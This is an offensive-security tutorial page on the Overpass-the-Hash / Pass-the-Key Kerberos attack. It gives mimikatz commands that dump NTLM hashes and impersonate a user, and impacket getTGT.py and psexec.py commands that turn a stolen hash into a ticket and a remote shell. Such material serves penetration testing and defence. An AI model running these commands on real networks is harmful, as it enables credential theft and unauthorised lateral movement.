# Overpass the Hash / Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.

In the case of over-pass-hash, we are generating the things that would get us that original TGT in memory on the windows client then fronting up to the domain controller for a service ticket to the thing we want access to, and automatically getting the TGT back as part of the exchange so that we can go on and request all access we want to other things.

{% hint style="info" %}
In order to perform this attack, the **NTLM hash \(or password\) of the target user account is needed**. Thus, once a user hash is obtained, a TGT can be requested for that account. Finally, it is possible to **access** any service or machine **where the user account has permissions**.
{% endhint %}

## Grab the Target User Hash

In the target machine run this and dump the NTLM hash of the 'target-user' account:

```text
Sekurlsa::logonpasswords
```

## Overpass the Hash

Using our new hash, we issue the command:

```text
sekurlsa::pth /user:target-user /domain:megabank.local /ntlm:89551acff8895768e489bb3054af94fd
```

#### We should be able to now move from our shell that was running as whomever , to a shell with  'target-user' credentials.

we can use getTGT.py script from impacket toolkit as well:

```text
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

You can **specify** `-aesKey [AES key]` to specify to use **AES256**. You can also use the ticket with other tools like: as smbexec.py or wmiexec.py

